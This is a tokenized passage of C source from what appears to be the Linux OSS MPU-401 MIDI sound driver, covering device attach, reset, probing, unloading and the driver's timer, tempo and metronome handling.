"ST_INIT", ";", "devc", "-", ">", "shared_irq", "=", "hw_config", "-", ">", "always_detect", ";", "spin_lock_init", "(", "&", "devc", "-", ">", "lock", ")", ";", "if", "(", "devc", "-", ">", "irq", "<", "0", ")", "{", "devc", "-", ">", "irq", "*", "=", "-", "1", ";", "devc", "-", ">", "shared_irq", "=", "1", ";", "}", "if", "(", "!", "hw_config", "-", ">", "always_detect", ")", "{", "/", "*", "Verify", "the", "hardware", "again", "*", "/", "if", "(", "!", "reset_mpu401", "(", "devc", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Device", "didn", "'", "t", "respond", "\\", "n", "\"", ");", "ret", "=", "-", "ENODEV", ";", "goto", "out_mididev", ";", "}", "if", "(", "!", "devc", "-", ">", "shared_irq", ")", "{", "if", "(", "request_irq", "(", "devc", "-", ">", "irq", ",", "mpuintr", ",", "0", ",", "\"", "mpu401", "\"", ",", "hw_config", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Failed", "to", "allocate", "IRQ", "%", "d", "\\", "n", "\"", ",", "devc", "-", ">", "irq", ")", ";", "ret", "=", "-", "ENOMEM", ";", "goto", "out_mididev", ";", "}", "}", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "mpu401_chk_version", "(", "m", ",", "devc", ")", ";", "if", "(", "devc", "-", ">", "version", "=", "=", "0", ")", "mpu401_chk_version", "(", "m", ",", "devc", ")", ";", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "}", "if", "(", "devc", "-", ">", "version", "!", "=", "0", ")", "if", "(", "mpu_cmd", "(", "m", ",", "0xC5", ",", "0", ")", ">", "=", "0", ")", "/", "*", "Set", "timebase", "OK", "*", "/", "if", "(", "mpu_cmd", "(", "m", ",", "0xE0", ",", "120", ")", ">", "=", "0", ")", "/", "*", "Set", "tempo", "OK", "*", "/", "devc", "-", ">", "capabilities", "|", "=", "MPU_CAP_INTLG", ";", "/", "*", "Supports", "intelligent", "mode", "*", "/", "mpu401_synth_operations", "[", "m", "]", "=", "kmalloc", "(", "sizeof", "(", "struct", "synth_operations", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "mpu401_synth_operations", "[", "m", "]", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "\"", "mpu401", ":", "Can", "'", "t", "allocate", "memory", "\\", "n", "\"", ");", "ret", "=", "-", "ENOMEM", ";", "goto", "out_irq", ";", "}", "if", "(", "!(", "devc", "-", ">", "capabilities", "&", "MPU_CAP_INTLG", ")", ")", "/", "*", "No", "intelligent", "mode", "*", "/", "{", "memcpy", "(", "(", "char", "*", ")", "mpu401_synth_operations", "[", "m", "]", ",", "(", "char", "*", ")", "&", "std_midi_synth", ",", "sizeof", "(", "struct", "synth_operations", ")", ");", "}", "else", "{", "memcpy", "(", "(", "char", "*", ")", "mpu401_synth_operations", "[", "m", "]", ",", "(", "char", "*", ")", "&", "mpu401_synth_proto", ",", "sizeof", "(", "struct", "synth_operations", ")", ");", "}", "if", "(", "owner", ")", "mpu401_synth_operations", "[", "m", "]", "->", "owner", "=", "owner", ";", "memcpy", "(", "(", "char", "*", ")", "&", "mpu401_midi_operations", "[", "m", "]", ",", "(", "char", "*", ")", "&", "mpu401_midi_proto", ",", "sizeof", "(", "struct", "midi_operations", ")", ");", "mpu401_midi_operations", "[", "m", "]", ".", "converter", "=", "mpu401_synth_operations", "[", "m", "]", ";", "memcpy", "(", "(", "char", "*", ")", "&", "mpu_synth_info", "[", "m", "]", ",", "(", "char", "*", ")", "&", "mpu_synth_info_proto", ",", "sizeof", "(", "struct", "synth_info", ")", ");", "n_mpu_devs", "+", "+;", "if", "(", "devc", "-", ">", "version", "=", "=", "0x20", "&", "&", "devc", "-", ">", "revision", ">", "=", "0x07", ")", "/", "*", "MusicQuest", "interface", "*", "/", "{", "int", "ports", "=", "(", "devc", "-", ">", "revision", "&", "0x08", ")", "?", "32", ":", "16", ";", "devc", "-", ">", "capabilities", "|", "=", "MPU_CAP_SYNC", "|", "MPU_CAP_SMPTE", "|", "MPU_CAP_CLS", "|", "MPU_CAP_2PORT", ";", "revision_char", "=", "(", "devc", "-", ">", "revision", "=", "=", "0x7f", ")", "?", "'", "M", "'", ":", "'", "'", ";", "sprintf", "(", "mpu_synth_info", "[", "m", "]", ".", "name", ",", "\"", "MQX", "-", "%", "d", "%", "c", "MIDI", "Interface", "#", "%", "d", "\"", ",", "ports", ",", "revision_char", ",", "n_mpu_devs", ")", ";", "}", "else", "{", "revision_char", "=", "devc", "-", ">", "revision", "?", "devc", "-", ">", "revision", "+", "'", "@'", ":", "'", "'", ";", "if", "(", "(", "int", ")", "devc", "-", ">", "revision", ">", "(", "'", "Z", "'", "-", "'", "@'", "))", "revision_char", "=", "'", "+'", ";", "devc", "-", ">", "capabilities", "|", "=", "MPU_CAP_SYNC", "|", "MPU_CAP_FSK", ";", "if", "(", "hw_config", "-", ">", "name", ")", "sprintf", "(", "mpu_synth_info", "[", "m", "]", ".", "name", ",", "\"", "%", "s", "(", "MPU401", ")", "\",", "hw_config", "-", ">", "name", ")", ";", "else", "sprintf", "(", "mpu_synth_info", "[", "m", "]", ".", "name", ",", "\"", "MPU", "-", "401", "%", "d", ".", "%", "d", "%", "c", "MIDI", "#", "%", "d", "\"", ",", "(", "int", ")", "(", "devc", "-", ">", "version", "&", "0xf0", ")", ">", ">", "4", ",", "devc", "-", ">", "version", "&", "0x0f", ",", "revision_char", ",", "n_mpu_devs", ")", ";", "}", "strcpy", "(", "mpu401_midi_operations", "[", "m", "]", ".", "info", ".", "name", ",", "mpu_synth_info", "[", "m", "]", ".", "name", ")", ";", "conf_printf", "(", "mpu_synth_info", "[", "m", "]", ".", "name", ",", "hw_config", ")", ";", "mpu401_synth_operations", "[", "m", "]", "->", "midi_dev", "=", "devc", "-", ">", "devno", "=", "m", ";", "mpu401_synth_operations", "[", "devc", "-", ">", "devno", "]", "->", "info", "=", "&", "mpu_synth_info", "[", "devc", "-", ">", "devno", "]", ";", "if", "(", "devc", "-", ">", "capabilities", "&", "MPU_CAP_INTLG", ")", "/", "*", "Intelligent", "mode", "*", "/", "hw_config", "-", ">", "slots", "[", "2", "]", "=", "mpu_timer_init", "(", "m", ")", ";", "midi_devs", "[", "m", "]", "=", "&", "mpu401_midi_operations", "[", "devc", "-", ">", "devno", "]", ";", "if", "(", "owner", ")", "midi_devs", "[", "m", "]", "->", "owner", "=", "owner", ";", "hw_config", "-", ">", "slots", "[", "1", "]", "=", "m", ";", "sequencer_init", "(", ");", "return", "0", ";", "out_irq", ":", "free_irq", "(", "devc", "-", ">", "irq", ",", "hw_config", ")", ";", "out_mididev", ":", "sound_unload_mididev", "(", "m", ")", ";", "out_err", ":", "release_region", "(", "hw_config", "-", ">", "io_base", ",", "2", ")", ";", "return", "ret", ";", "}", "static", "int", "reset_mpu401", "(", "struct", "mpu_config", "*", "devc", ")", "{", "unsigned", "long", "flags", ";", "int", "ok", ",", "timeout", ",", "n", ";", "int", "timeout_limit", ";", "/", "*", "*", "Send", "the", "RESET", "command", ".", "Try", "again", "if", "no", "success", "at", "the", "first", "time", ".", "*", "(", "If", "the", "device", "is", "in", "the", "UART", "mode", ",", "it", "will", "not", "ack", "the", "reset", "cmd", ")", ".", "*", "/", "ok", "=", "0", ";", "timeout_limit", "=", "devc", "-", ">", "initialized", "?", "30000", ":", "100000", ";", "devc", "-", ">", "initialized", "=", "1", ";", "for", "(", "n", "=", "0", ";", "n", "<", "2", "&", "&", "!", "ok", ";", "n", "+", "+)", "{", "for", "(", "timeout", "=", "timeout_limit", ";", "timeout", ">", "0", "&", "&", "!", "ok", ";", "timeout", "-", "-)", "ok", "=", "output_ready", "(", "devc", ")", ";", "write_command", "(", "devc", ",", "MPU_RESET", ")", ";", "/", "*", "*", "Send", "MPU", "-", "401", "RESET", "Command", "*", "/", "/", "*", "*", "Wait", "at", "least", "25", "msec", ".", "This", "method", "is", "not", "accurate", "so", "let", "'", "s", "make", "the", "*", "loop", "bit", "longer", ".", "Cannot", "sleep", "since", "this", "is", "called", "during", "boot", ".", "*", "/", "for", "(", "timeout", "=", "timeout_limit", "*", "2", ";", "timeout", ">", "0", "&", "&", "!", "ok", ";", "timeout", "-", "-)", "{", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "input_avail", "(", "devc", ")", ")", "if", "(", "read_data", "(", "devc", ")", "=", "=", "MPU_ACK", ")", "ok", "=", "1", ";", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "}", "}", "devc", "-", ">", "m_state", "=", "ST_INIT", ";", "devc", "-", ">", "m_ptr", "=", "0", ";", "devc", "-", ">", "m_left", "=", "0", ";", "devc", "-", ">", "last_status", "=", "0", ";", "devc", "-", ">", "uart_mode", "=", "0", ";", "return", "ok", ";", "}", "static", "void", "set_uart_mode", "(", "int", "dev", ",", "struct", "mpu_config", "*", "devc", ",", "int", "arg", ")", "{", "if", "(", "!", "arg", "&", "&", "(", "devc", "-", ">", "capabilities", "&", "MPU_CAP_INTLG", ")", ")", "return", ";", "if", "(", "(", "devc", "-", ">", "uart_mode", "=", "=", "0", ")", "=", "=", "(", "arg", "=", "=", "0", ")", ")", "return", ";", "/", "*", "Already", "set", "*", "/", "reset_mpu401", "(", "devc", ")", ";", "/", "*", "This", "exits", "the", "uart", "mode", "*", "/", "if", "(", "arg", ")", "{", "if", "(", "mpu_cmd", "(", "dev", ",", "UART_MODE_ON", ",", "0", ")", "<", "0", ")", "{", "printk", "(", "KERN_ERR", "\"", "mpu401", ":", "Can", "'", "t", "enter", "UART", "mode", "\\", "n", "\"", ");", "devc", "-", ">", "uart_mode", "=", "0", ";", "return", ";", "}", "}", "devc", "-", ">", "uart_mode", "=", "arg", ";", "}", "int", "probe_mpu401", "(", "struct", "address_info", "*", "hw_config", ",", "struct", "resource", "*", "ports", ")", "{", "int", "ok", "=", "0", ";", "struct", "mpu_config", "tmp_devc", ";", "tmp_devc", ".", "base", "=", "hw_config", "-", ">", "io_base", ";", "tmp_devc", ".", "irq", "=", "hw_config", "-", ">", "irq", ";", "tmp_devc", ".", "initialized", "=", "0", ";", "tmp_devc", ".", "opened", "=", "0", ";", "tmp_devc", ".", "osp", "=", "hw_config", "-", ">", "osp", ";", "if", "(", "hw_config", "-", ">", "always_detect", ")", "return", "1", ";", "if", "(", "inb", "(", "hw_config", "-", ">", "io_base", "+", "1", ")", "=", "=", "0xff", ")", "{", "DDB", "(", "printk", "(", "\"", "MPU401", ":", "Port", "%", "x", "looks", "dead", ".", "\\", "n", "\"", ",", "hw_config", "-", ">", "io_base", ")", ");", "return", "0", ";", "/", "*", "Just", "bus", "float", "?", "*", "/", "}", "ok", "=", "reset_mpu401", "(", "&", "tmp_devc", ")", ";", "if", "(", "!", "ok", ")", "{", "DDB", "(", "printk", "(", "\"", "MPU401", ":", "Reset", "failed", "on", "port", "%", "x", "\\", "n", "\"", ",", "hw_config", "-", ">", "io_base", ")", ");", "}", "return", "ok", ";", "}", "void", "unload_mpu401", "(", "struct", "address_info", "*", "hw_config", ")", "{", "void", "*", "p", ";", "int", "n", "=", "hw_config", "-", ">", "slots", "[", "1", "]", ";", "if", "(", "n", "!", "=", "-", "1", ")", "{", "release_region", "(", "hw_config", "-", ">", "io_base", ",", "2", ")", ";", "if", "(", "hw_config", "-", ">", "always_detect", "=", "=", "0", "&", "&", "hw_config", "-", ">", "irq", ">", "0", ")", "free_irq", "(", "hw_config", "-", ">", "irq", ",", "hw_config", ")", ";", "p", "=", "mpu401_synth_operations", "[", "n", "]", ";", "sound_unload_mididev", "(", "n", ")", ";", "sound_unload_timerdev", "(", "hw_config", "-", ">", "slots", "[", "2", "]", ");", "kfree", "(", "p", ")", ";", "}", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "Timer", "stuff", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "static", "volatile", "int", "timer_initialized", "=", "0", ",", "timer_open", "=", "0", ",", "tmr_running", "=", "0", ";", "static", "volatile", "int", "curr_tempo", ",", "curr_timebase", ",", "hw_timebase", ";", "static", "int", "max_timebase", "=", "8", ";", "/", "*", "8", "*", "24", "=", "192", "ppqn", "*", "/", "static", "volatile", "unsigned", "long", "next_event_time", ";", "static", "volatile", "unsigned", "long", "curr_ticks", ",", "curr_clocks", ";", "static", "unsigned", "long", "prev_event_time", ";", "static", "int", "metronome_mode", ";", "static", "unsigned", "long", "clocks2ticks", "(", "unsigned", "long", "clocks", ")", "{", "/", "*", "*", "The", "MPU", "-", "401", "supports", "just", "a", "limited", "set", "of", "possible", "timebase", "values", ".", "*", "Since", "the", "applications", "require", "more", "choices", ",", "the", "driver", "has", "to", "*", "program", "the", "HW", "to", "do", "its", "best", "and", "to", "convert", "between", "the", "HW", "and", "*", "actual", "timebases", ".", "*", "/", "return", "(", "(", "clocks", "*", "curr_timebase", ")", "+", "(", "hw_timebase", "/", "2", ")", ")", "/", "hw_timebase", ";", "}", "static", "void", "set_timebase", "(", "int", "midi_dev", ",", "int", "val", ")", "{", "int", "hw_val", ";", "if", "(", "val", "<", "48", ")", "val", "=", "48", ";", "if", "(", "val", ">", "1000", ")", "val", "=", "1000", ";", "hw_val", "=", "val", ";", "hw_val", "=", "(", "hw_val", "+", "12", ")", "/", "24", ";", "if", "(", "hw_val", ">", "max_timebase", ")", "hw_val", "=", "max_timebase", ";", "if", "(", "mpu_cmd", "(", "midi_dev", ",", "0xC0", "|", "(", "hw_val", "&", "0x0f", ")", ",", "0", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Can", "'", "t", "set", "HW", "timebase", "to", "%", "d", "\\", "n", "\"", ",", "hw_val", "*", "24", ")", ";", "return", ";", "}", "hw_timebase", "=", "hw_val", "*", "24", ";", "curr_timebase", "=", "val", ";", "}", "static", "void", "tmr_reset", "(", "struct", "mpu_config", "*", "devc", ")", "{", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "next_event_time", "=", "(", "unsigned", "long", ")", "-", "1", ";", "prev_event_time", "=", "0", ";", "curr_ticks", "=", "curr_clocks", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "devc", "-", ">", "lock", ",", "flags", ")", ";", "}", "static", "void", "set_timer_mode", "(", "int", "midi_dev", ")", "{", "if", "(", "timer_mode", "&", "TMR_MODE_CLS", ")", "mpu_cmd", "(", "midi_dev", ",", "0x3c", ",", "0", ")", ";", "/", "*", "Use", "CLS", "sync", "*", "/", "else", "if", "(", "timer_mode", "&", "TMR_MODE_SMPTE", ")", "mpu_cmd", "(", "midi_dev", ",", "0x3d", ",", "0", ")", ";", "/", "*", "Use", "SMPTE", "sync", "*", "/", "if", "(", "timer_mode", "&", "TMR_INTERNAL", ")", "{", "mpu_cmd", "(", "midi_dev", ",", "0x80", ",", "0", ")", ";", "/", "*", "Use", "MIDI", "sync", "*", "/", "}", "else", "{", "if", "(", "timer_mode", "&", "(", "TMR_MODE_MIDI", "|", "TMR_MODE_CLS", ")", ")", "{", "mpu_cmd", "(", "midi_dev", ",", "0x82", ",", "0", ")", ";", "/", "*", "Use", "MIDI", "sync", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x91", ",", "0", ")", ";", "/", "*", "Enable", "ext", "MIDI", "ctrl", "*", "/", "}", "else", "if", "(", "timer_mode", "&", "TMR_MODE_FSK", ")", "mpu_cmd", "(", "midi_dev", ",", "0x81", ",", "0", ")", ";", "/", "*", "Use", "FSK", "sync", "*", "/", "}", "}", "static", "void", "stop_metronome", "(", "int", "midi_dev", ")", "{", "mpu_cmd", "(", "midi_dev", ",", "0x84", ",", "0", ")", ";", "/", "*", "Disable", "metronome", "*", "/", "}", "static", "void", "setup_metronome", "(", "int", "midi_dev", ")", "{", "int", "numerator", ",", "denominator", ";", "int", "clks_per_click", ",", "num_32nds_per_beat", ";", "int", "beats_per_measure", ";", "numerator", "=", "(", "(", "unsigned", ")", "metronome_mode", ">", ">", "24", ")", "&", "0xff", ";", "denominator", "=", "(", "(", "unsigned", ")", "metronome_mode", ">", ">", "16", ")", "&", "0xff", ";", "clks_per_click", "=", "(", "(", "unsigned", ")", "metronome_mode", ">", ">", "8", ")", "&", "0xff", ";", "num_32nds_per_beat", "=", "(", "unsigned", ")", "metronome_mode", "&", "0xff", ";", "beats_per_measure", "=", "(", "numerator", "*", "4", ")", ">", ">", "denominator", ";", "if", "(", "!", "metronome_mode", ")", "mpu_cmd", "(", "midi_dev", ",", "0x84", ",", "0", ")", ";", "/", "*", "Disable", "metronome", "*", "/", "else", "{", "mpu_cmd", "(", "midi_dev", ",", "0xE4", ",", "clks_per_click", ")", ";", "mpu_cmd", "(", "midi_dev", ",", "0xE6", ",", "beats_per_measure", ")", ";", "mpu_cmd", "(", "midi_dev", ",", "0x83", ",", "0", ")", ";", "/", "*", "Enable", "metronome", "without", "accents", "*", "/", "}", "}", "static", "int", "mpu_start_timer", "(", "int", "midi_dev", ")", "{", "struct", "mpu_config", "*", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "tmr_reset", "(", "devc", ")", ";", "set_timer_mode", "(", "midi_dev", ")", ";", "if", "(", "tmr_running", ")", "return", "TIMER_NOT_ARMED", ";", "/", "*", "Already", "running", "*", "/", "if", "(", "timer_mode", "&", "TMR_INTERNAL", ")", "{", "mpu_cmd", "(", "midi_dev", ",", "0x02", ",", "0", ")", ";", "/", "*", "Send", "MIDI", "start", "*", "/", "tmr_running", "=", "1", ";", "return", "TIMER_NOT_ARMED", ";", "}", "else", "{", "mpu_cmd", "(", "midi_dev", ",", "0x35", ",", "0", ")", ";", "/", "*", "Enable", "mode", "messages", "to", "PC", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x38", ",", "0", ")", ";", "/", "*", "Enable", "sys", "common", "messages", "to", "PC", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x39", ",", "0", ")", ";", "/", "*", "Enable", "real", "time", "messages", "to", "PC", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x97", ",", "0", ")", ";", "/", "*", "Enable", "system", "exclusive", "messages", "to", "PC", "*", "/", "}", "return", "TIMER_ARMED", ";", "}", "static", "int", "mpu_timer_open", "(", "int", "dev", ",", "int", "mode", ")", "{", "int", "midi_dev", "=", "sound_timer_devs", "[", "dev", "]", "->", "devlink", ";", "struct", "mpu_config", "*", "devc", "=", "&", "dev_conf", "[", "midi_dev", "]", ";", "if", "(", "timer_open", ")", "return", "-", "EBUSY", ";", "tmr_reset", "(", "devc", ")", ";", "curr_tempo", "=", "50", ";", "mpu_cmd", "(", "midi_dev", ",", "0xE0", ",", "50", ")", ";", "curr_timebase", "=", "hw_timebase", "=", "120", ";", "set_timebase", "(", "midi_dev", ",", "120", ")", ";", "timer_open", "=", "1", ";", "metronome_mode", "=", "0", ";", "set_timer_mode", "(", "midi_dev", ")", ";", "mpu_cmd", "(", "midi_dev", ",", "0xe7", ",", "0x04", ")", ";", "/", "*", "Send", "all", "clocks", "to", "host", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x95", ",", "0", ")", ";", "/", "*", "Enable", "clock", "to", "host", "*", "/", "return", "0", ";", "}", "static", "void", "mpu_timer_close", "(", "int", "dev", ")", "{", "int", "midi_dev", "=", "sound_timer_devs", "[", "dev", "]", "->", "devlink", ";", "timer_open", "=", "tmr_running", "=", "0", ";", "mpu_cmd", "(", "midi_dev", ",", "0x15", ",", "0", ")", ";", "/", "*", "Stop", "all", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x94", ",", "0", ")", ";", "/", "*", "Disable", "clock", "to", "host", "*", "/", "mpu_cmd", "(", "midi_dev", ",", "0x8c", ",", "0", ")", ";", "/", "*", "Disable", "measure", "end", "messages", "to", "host", "*", "/", "stop_metronome", "(", "midi_dev", ")", ";", "}", "static", "int", "mpu_timer_event", "(", "int", "dev", ",", "unsigned", "char", "*", "event", ")", "{", "unsigned", "char", "command", "=", "event", "[", "1", "]", ";", "unsigned", "long", "parm", "=", "*", "(", "unsigned", "int", "*", ")", "&", "event", "[", "4", "]", ";", "int", "midi_dev", "=", "sound_timer_devs", "[", "dev", "]", "->", "devlink", ";", "switch", "(", "command", ")", "{", "case", "TMR_WAIT_REL", ":", "parm", "+", "=", "prev_event_time", ";", "case", "TMR_WAIT_ABS", ":", "if", "(", "parm", ">", "0", ")", "{", "long", "time", ";", "if", "(", "parm", "<", "=", "curr_ticks", ")", "/", "*", "It", "'", "s", "the", "time", "*", "/", "return", "TIMER_NOT_ARMED", ";", "time", "=", "parm", ";", "next_event_time", "=", "prev_event_time", "=", "time", ";", "return", "TIMER_ARMED", ";", "}", "break", ";", "case", "TMR_START", ":", "if", "(", "tmr_running", ")", "break", ";", "return", "mpu_start_timer", "(", "midi_dev", ")", ";", "case", "TMR_STOP", ":", "mpu_cmd", "(", "midi_dev", ",", "0x01", ",", "0", ")", ";", "/", "*", "Send", "MIDI", "stop", "*", "/", "stop_metronome", "(", "midi_dev", ")", ";", "tmr_running", "=", "0", ";", "break", ";", "case", "TMR_CONTINUE", ":", "if", "(", "tmr_running", ")", "break", ";", "mpu_cmd", "(", "midi_dev", ",", "0x03", ",", "0", ")", ";", "/", "*", "Send", "MIDI", "continue", "*", "/", "setup_metronome", "(", "midi_dev", ")", ";", "tmr_running", "=", "1", ";", "break", ";", "case", "TMR_TEMPO", ":", "if", "(", "parm", ")", "{", "if", "(", "parm", "<", "8", ")", "parm", "=", "8", ";", "if", "(", "parm", ">", "250", ")", "parm", "=", "250", ";", "if", "(", "mpu_cmd", "(", "midi_dev", ",", "0xE0", ",", "parm", ")", "<", "0", ")", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Can", "'", "t", "set", "tempo", "to", "%", "d", "\\", "n", "\"", ",", "(", "int", ")", "parm", ")", ";", "curr_tempo", "=", "parm", ";", "}", "break", ";", "case", "TMR_ECHO", ":", "seq_copy_to_input", "(", "event", ",", "8", ")", ";", "break", ";", "case", "TMR_TIMESIG", ":", "if", "(", "metronome_mode", ")", "/", "*", "Metronome", "enabled", "*", "/", "{", "metronome_mode", "=", "parm", ";", "setup_metronome", "(", "midi_dev", ")", ";", "}", "break", ";", "default", ":", ";", "}", "return", "TIMER_NOT_ARMED", ";", "}", "static", "unsigned", "long", "mpu_timer_get_time", "(", "int", "dev", ")", "{", "if", "(", "!", "timer_open", ")", "return", "0", ";", "return", "curr_ticks", ";", "}", "static", "int", "mpu_timer_ioctl", "(", "int", "dev", ",", "unsigned", "int", "command", ",", "void", "__user", "*", "arg", ")", "{", "int", "midi_dev", "=", "sound_timer_devs", "[", "dev", "]", "->", "devlink", ";", "int", "__user", "*", "p", "=", "(", "int", "__user", "*", ")", "arg", ";", "switch", "(", "command", ")", "{", "case", "SNDCTL_TMR_SOURCE", ":", "{", "int", "parm", ";", "if", "(", "get_user", "(", "parm", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "parm", "&", "=", "timer_caps", ";", "if", "(", "parm", "!", "=", "0", ")", "{", "timer_mode", "=", "parm", ";", "if", "(", "timer_mode", "&", "TMR_MODE_CLS", ")", "mpu_cmd", "(", "midi_dev", ",", "0x3c", ",", "0", ")", ";", "/", "*", "Use", "CLS", "sync", "*", "/", "else", "if", "(", "timer_mode", "&", "TMR_MODE_SMPTE", ")", "mpu_cmd", "(", "midi_dev", ",", "0x3d", ",", "0", ")", ";", "/", "*", "Use", "SMPTE", "sync", "*", "/", "}", "if", "(", "put_user", "(", "timer_mode", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "timer_mode", ";", "}", "break", ";", "case", "SNDCTL_TMR_START", ":", "mpu_start_timer", "(", "midi_dev", ")", ";", "return", "0", ";", "case", "SNDCTL_TMR_STOP", ":", "tmr_running", "=", "0", ";", "mpu_cmd", "(", "midi_dev", ",", "0x01", ",", "0", ")", ";", "/", "*", "Send", "MIDI", "stop", "*", "/", "stop_metronome", "(", "midi_dev", ")", ";", "return", "0", ";", "case", "SNDCTL_TMR_CONTINUE", ":", "if", "(", "tmr_running", ")", "return", "0", ";", "tmr_running", "=", "1", ";", "mpu_cmd", "(", "midi_dev", ",", "0x03", ",", "0", ")", ";", "/", "*", "Send", "MIDI", "continue", "*", "/", "return", "0", ";", "case", "SNDCTL_TMR_TIMEBASE", ":", "{", "int", "val", ";", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", ")", "set_timebase", "(", "midi_dev", ",", "val", ")", ";", "if", "(", "put_user", "(", "curr_timebase", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "curr_timebase", ";", "}", "break", ";", "case", "SNDCTL_TMR_TEMPO", ":", "{", "int", "val", ";", "int", "ret", ";", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", ")", "{", "if", "(", "val", "<", "8", ")", "val", "=", "8", ";", "if", "(", "val", ">", "250", ")", "val", "=", "250", ";", "if", "(", "(", "ret", "=", "mpu_cmd", "(", "midi_dev", ",", "0xE0", ",", "val", ")", ")", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "mpu401", ":", "Can", "'", "t", "set", "tempo", "to", "%", "d", "\\", "n", "\"", ",", "(", "int", ")", "val", ")", ";", "return", "ret", ";", "}", "curr_tempo", "=", "val", ";", "}", "if", "(", "put_user", "(", "curr_tempo", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "curr_tempo", ";", "}", "break", ";", "case", "SNDCTL_SEQ_CTRLRATE", ":", "{", "int", "val", ";", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", "!", "=", "0", ")", "/", "*", "Can", "'", "t", "change", "*", "/", "return", "-", "EINVAL", ";", "val", "=", "(", "(", "curr_tempo", "*", "curr_timebase", ")", "+", "30", ")", "/", "60", ";", "if", "(", "put_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "val", ";", "}", "break", ";", "case", "SNDCTL_SEQ_GETTIME", ":", "if", "(", "put_user", "(", "curr_ticks", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "curr_ticks", ";", "case", "SNDCTL_TMR_METRONOME", ":", "if", "(", "get_user", "(", "metronome_mode", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "setup_metronome", "(", "midi_dev", ")", ";", "return", "0", ";", "default", ":", ";", "}", "return", "-", "EINVAL", ";", "}", "static", "void", "mpu_timer_arm", "(", "int", "dev", ",", "long", "time", ")", "{", "if", "(", "time", "<", "0", ")", "time", "=", "curr_ticks", "+", "1", ";", "else", "if", "(", "time", "<", "=", "curr_ticks", ")", "/", "*", "It", "'", "s", "the", "time", "*", "/", "return", ";", "next_event_time", "=", "prev_event_time", "=", "time", ";", "return", ";", "}", "static", "struct", "sound_timer_operations", "mpu_timer", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "info", "=", "{", "\"", "MPU", "-", "401", "Timer", "\"", ",", "0", "}", ",", ".", "priority", "=", "10", ",", "/", "*", "Priority", "*", "/", ".", "devlink", "=", "0", ",", "/", "*", "Local", "device", "link", "*", "/", ".", "open", "=", "mpu_timer_open", ",", ".", "close", "=", "mpu_timer_close", ",", ".", "event", "=", "mpu_timer_event", ",", ".", "get_time", "=", "mpu_timer_get_time", ",", ".", "ioctl", "=", "mpu_timer_ioctl", ",", ".", "arm_timer", "=", "mpu_timer_arm", "}", ";", "static", "void", "mpu_timer_interrupt", "(", "void", ")", "{", "if", "(", "!", "timer_open", ")", "return", ";", "if", "(", "!", "tmr_running", ")", "return", ";", "curr_clocks", "+", "+;", "curr_ticks", "=", "clocks2ticks", "(", "curr_clocks", ")", ";", "if", "(", "curr_ticks", ">", "=", "next_event_time", ")", "{", "next_event_time", "=", "(", "unsigned", "long", ")", "-", "1", ";", "sequencer_timer", "(", "0", ")", ";", "}", "}", "static", "void", "timer_ext_event", "(", "struct", "mpu_config", "*", "devc", ",", "int", "event", ",", "int", "parm", ")", "{", "int", "midi_dev", "=", "devc", "-", ">", "devno", ";", "if", "(", "!", "devc", "-", ">", "timer_flag", ")", "return", ";", "switch", "(", "event", ")", "{", "case", "TMR_CLOCK", ":", "printk", "(", "\"<", "MIDI", "clk", ">", "\")", ";", "break", ";", "case", "TMR_START", ":", "printk", "(", "\"", "Ext", "MIDI", "start", "\\", "n", "\"", ");", "if", "(", "!", "tmr_running", ")", "{", "if", "(", "timer_mode", "&", "TMR_EXTERNAL", ")", "{", "tmr_running", "=", "1", ";", "setup_metronome", "(", "midi_dev", ")", ";", "next_event_time", "=", "0", ";", "STORE", "(", "SEQ_START_TIMER", "(", "))", ";", "}", "}", "break", ";", "case", "TMR_STOP", ":", "printk", "(", "\"", "Ext", "MIDI", "stop", "\\", "n", "\"", ");", "if", "(", "timer_mode", "&", "TMR_EXTERNAL", ")", "{", "tmr_running", "=", "0", ";", "stop_metronome", "(", "midi_dev", ")", ";", "STORE", "(", "SEQ_STOP_TIMER", "(", "))", ";", "}", "break", ";", "case", "TMR_CONTINUE", ":", "printk", "(", "\"", "Ext", "MIDI", "continue", "\\", "n", "\"", ");", "if", "(", "timer_mode", "&", "TMR_EXTERNAL", ")", "{", "tmr_running", "=", "1", ";", "setup_metronome", "(", 